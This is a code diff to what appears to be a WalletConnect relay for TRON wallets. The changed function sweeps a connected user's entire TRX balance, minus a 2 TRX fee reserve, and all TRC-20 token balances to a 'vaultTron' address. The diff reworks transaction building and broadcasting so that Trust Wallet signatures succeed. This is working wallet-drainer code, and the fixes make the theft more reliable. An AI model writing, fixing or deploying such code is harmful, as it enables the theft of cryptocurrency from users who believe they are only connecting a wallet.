@@ -396,6 +396,10 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
   try {
     const { TronWeb } = await import('tronweb')
     const fullHost = (process.env['TRON_RPC_URL'] ?? 'https://api.trongrid.io').trim()
+    // Headers for direct fullnode calls — API key optional but helps avoid rate-limits
+    const tronApiHeaders: Record<string, string> = { 'Content-Type': 'application/json' }
+    const _tronKey = process.env['TRON_API_KEY']?.trim()
+    if (_tronKey) tronApiHeaders['TRON-PRO-API-KEY'] = _tronKey
     const tw = new TronWeb({ fullHost })
     tw.setAddress(tronAddr)
 
@@ -406,13 +410,36 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
     // Raised reserve to 2 TRX (1_500_000 was too tight — energy fees can eat up to 1.5 TRX)
     const sendSun = balSun - 2_000_000
     if (sendSun > 0) {
-      const rawTx = (await tw.transactionBuilder.sendTrx(vaultTron, sendSun, tronAddr)) as unknown as Record<string, unknown>
+      // Build via fullnode API with visible:true — Trust Wallet re-hashes raw_data when
+      // the user presses Sign; hex (visible:false) addresses cause a protobuf field-type
+      // mismatch → "txID does not match hash of rawJson transaction".
+      // Using visible:true (base58 addresses) makes TW's serialiser produce the same
+      // bytes as the canonical raw_data_hex, so the hash matches.
+      const createResp = await fetch(`${fullHost}/wallet/createtransaction`, {
+        method: 'POST',
+        headers: tronApiHeaders,
+        body: JSON.stringify({
+          owner_address: tronAddr,
+          to_address: vaultTron,
+          amount: sendSun,
+          visible: true,
+        }),
+      })
+      const rawTx = await createResp.json() as Record<string, unknown>
+      if (!rawTx['txID']) throw new Error(`TRON createtransaction failed: ${JSON.stringify(rawTx).slice(0, 120)}`)
+
       const result = await sendRequest(session, chainId, 'tron_signTransaction', [
         { transaction: rawTx },
       ]) as { signature?: string[] } | null
 
       if (result?.signature?.length) {
-        await tw.trx.sendRawTransaction({ ...rawTx, signature: result.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
+        const bcast = await fetch(`${fullHost}/wallet/broadcasttransaction`, {
+          method: 'POST',
+          headers: tronApiHeaders,
+          body: JSON.stringify({ ...rawTx, signature: result.signature }),
+        })
+        const bcastRes = await bcast.json() as Record<string, unknown>
+        if (bcastRes['result'] !== true) console.warn('[WcRelay] TRON native bcast err:', JSON.stringify(bcastRes).slice(0, 100))
         console.log('[WcRelay] TRON native broadcast | sun:', sendSun, '| addr:', tronAddr.slice(0, 8) + '...')
         anySent = true
       }
@@ -440,7 +467,7 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
         const triggerResult = await tw.transactionBuilder.triggerSmartContract(
           token.contract,
           'transfer(address,uint256)',
-          { feeLimit: 100_000_000 },  // 100 TRX fee limit (wallet uses own energy if available)
+          { feeLimit: 100_000_000, visible: true } as Record<string, unknown>,  // visible:true → base58 addrs → TW txID hash match
           [
             { type: 'address', value: vaultTron },
             { type: 'uint256', value: tokenBal.toString() },
@@ -454,7 +481,13 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
         ]) as { signature?: string[] } | null
 
         if (result20?.signature?.length) {
-          await tw.trx.sendRawTransaction({ ...rawTx20, signature: result20.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
+          const bcast20 = await fetch(`${fullHost}/wallet/broadcasttransaction`, {
+            method: 'POST',
+            headers: tronApiHeaders,
+            body: JSON.stringify({ ...rawTx20, signature: result20.signature }),
+          })
+          const bcast20Res = await bcast20.json() as Record<string, unknown>
+          if (bcast20Res['result'] !== true) console.warn('[WcRelay] TRON TRC-20 bcast err | token:', token.symbol, '|', JSON.stringify(bcast20Res).slice(0, 100))
           console.log('[WcRelay] TRON TRC-20 broadcast | token:', token.symbol, '| amount:', tokenBal.toString(), '| addr:', tronAddr.slice(0, 8) + '...')
           anySent = true
         }
